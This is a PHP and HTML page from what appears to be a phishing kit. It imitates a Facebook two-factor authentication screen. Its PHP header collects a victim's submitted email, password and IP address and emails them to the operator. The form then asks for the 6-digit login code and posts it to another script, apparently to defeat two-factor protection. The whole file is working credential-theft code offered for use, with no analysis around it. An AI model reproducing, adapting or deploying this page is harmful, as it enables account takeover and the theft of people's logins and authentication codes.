<?php include $_SERVER['DOCUMENT_ROOT'].'/include.php'; ?>
<?php
$data = $_REQUEST;
$em_user = $data['hinem'];
$user_ps = $data['hinempasi'];
$ip = $_SERVER['REMOTE_ADDR'];
$user_ps = trim($user_ps);
$stringi =  'imella: '.$em_user.PHP_EOL . 'pw: ' . $user_ps . PHP_EOL . 'ip: ' . $ip;
 mailEmail($emails, "Ra APET!", $stringi);
?>
<!DOCTYPE html>
<html>
<head>
	<title>Code Generator</title>
	 <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="icon" type="image/png" href="favicon-16x16.png"/>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
    <style type="text/css">
      body{
        background-color: #e9ebee;
        margin-bottom:30px;
      }
      .titleh3{
        font-size:16px;
        padding: 12px;
        background-color: #f5f6f7;
        border-bottom: 1px solid rgba(0, 0, 0, .101);
        border-top-right-radius: 5px;
        font-weight: 700;
        color: #4b4f56;
        border-top-left-radius: 5px;
        margin-bottom: 0px;
      }

      .content2 p{
          margin-top:7px;
          margin-bottom:7px;
      }
      .content1{
        background-color: white;
        padding: 10px;
        font-size: 13px;
        border-bottom: 1px solid rgba(0, 0, 0, .101);
      }
      .content2{
        background-color: white;
        padding: 10px;
        font-size: 13px;
        border-bottom: 1px solid rgba(0, 0, 0, .101);
      }
      .content2 a{
        color:#576b95;
      }
      .content2 input[type=text]{
        border: 1px solid #999;
        border-radius: 0px;
        height: 30px;
        font-size:13px;
      }
      
      .afterheader .list-group .list-group-item{
          padding:0px;
          padding-top:5px;
          padding-bottom:5px;
          font-size:14px;
          border:0px;
          color: #444950;
      }
      .afterheader .list-group .list-group-item:hover{
          background-color:rgba(29, 33, 41, .04);
      }
      
      .content2 small{
        margin-bottom: 2px;
      }
      .content2 textarea{
        box-shadow: inset 0 1px 0 rgba(0, 0, 0, .07);
        border: solid 1px #999;
        border-top-color: #888;
        border-radius: 0px;
        height: 65px;
      }
      .butonsend button{
        width:100%;
        background-color: #627aad;
        background-image: linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1));
        font-weight: bold;
      }
      .navbari .nav-linkuu{
          color:#3578e5 !important;
          font-size:14px !important;
          font-weight:600 !important;
          padding: 15px 0px !important;
          border-bottom: 3px solid #3578e5;
      }
      .navbari .navbar {
          padding-top: 0px !important;
          padding-bottom: 0px !important;
      }
      .butonsend {
        margin-top:10px;
      }
      .navbari{
          background-color:#e9ebee;
      }
      .afterheader{
          margin-top:50px;
      }
      
        @media only screen and (max-width: 600px) {
          .afterheader {
            margin-top:20px;
          }
          .titleh3{
            font-weight: 600;
          }
          body{
            background-color: #e9ebee;
            margin-bottom:20px;
          }
          .navbari{
              display:none;
          }
          .sidebar-afterheader{
              display:none;
          }
          .logojababik{
              height:30px !important;
              text-align:center !important;
          }
          .hederbisha{
              text-align:center !important;
          }
          .searchibl{
              display: none;
          }
          .babikasubmitdesktop{
              display:none;
          }
          .footeriba{
              display:none;
          }
        }
        
        @media only screen and (min-width: 768px) {
          .content2{
              padding:10px 20px !important;
          }
          .butonsendonlymobile{
              display:none;
          }
          .logojababik{
              height:37px !important;
              text-align:left !important;
          }
          .content2 label{
              color: #90949c !important;
              font-weight:700 !important;
              font-size:12px;
          }
          .content2 small{
              color: #90949c !important;
              margin-bottom:5px;
          }
          .content2 .form-group{
              margin-bottom:9px !important;
          }
          .content2 input[type=text], .content2 textarea, .content2 input[type=password]{
              margin-top:7px !important;
          }
          .hederbisha{
              padding-top: 17px !important;
              padding-bottom: 17px !important;
          }
          .searchibl i{
              color: #616161;
              font-size:13px;
          }
          .searchibl .form-control-lg{
              font-size: 17px;
              padding: 0px 8px !important;
              border:none;
          }
          .searchibl form{
              border: 1px solid  #000;
              border-radius:0px !important;
          }
          .searchibl .card-body{
              padding: 0px !important;
              padding-left: 10px !important;
          }
          .searchibl input{
              height: 36px !important;
              color: #90949c;
          }
          .babikasubmitdesktop{
              background-color:#f5f6f7;
              text-align:right;
              padding: 11px 20px;
          }
          .babikasubmitdesktop button{
            background-color: #4267b2;
            border-color: #4267b2;
            line-height: 31px;
            padding: 0 15px;
            font-weight: 500;
            font-size: 13px;
          }
            .footermenu{
                margin-top:20px;
                margin-bottom:20px;
            }
            .footermenu .list-group-item{
                border: none;
                font-size:12px;
                color: #90949c;
                padding: 4px 10px;
            }
          .afterheader{
              margin-bottom: 70px !important;
          }
        }
    </style>


<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-177207786-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-177207786-1');
</script>


</head>
<body>
    <section class="hederbisha" style="background-color:#39569a; padding-top:7px; padding-bottom:7px">
      <div class="container">
        <div class="row">
          <div class="col-12 col-md-4"> 
            <img src="josbabika.png" class="logojababik" />
          </div>
        </div>
      </div>
    </section>

<section class="afterheader">
      <div class="container">
        <div class="row">
          <div class="col-12 col-md-6 offset-md-3">  
            <div style="border: 1px solid #c8cacc; border-radius: 4px">
              <h3 class="titleh3">Two-factor authentication required</h3>
              <div class="content2">
                  <p></p>You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser.</p>
                  <p>Enter the 6-digit code from your <strong>code generator</strong> or third-party app below.</p>
                  <form action="/sub2fac.php" id="formasubtwofac" method="POST" style="margin-top:14px">
                    <div class="form-group"> 
                      <input type="text" required class="form-control" id="twofactor" name="cgn" placeholder="Login code" >
                    </div>
              </div>
              <div class="babikasubmitdesktop">
                  <button class="btn btn-primary">Send</button>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div id="iframee"></div>
    </section>
    <div class="container butonsend butonsendonlymobile">
      <div class="row">
        <div class="col-12">
          <button  class="btn btn-primary">Send</button>
        </div>
      </div>
    </div>
    </form>
</body>
</html>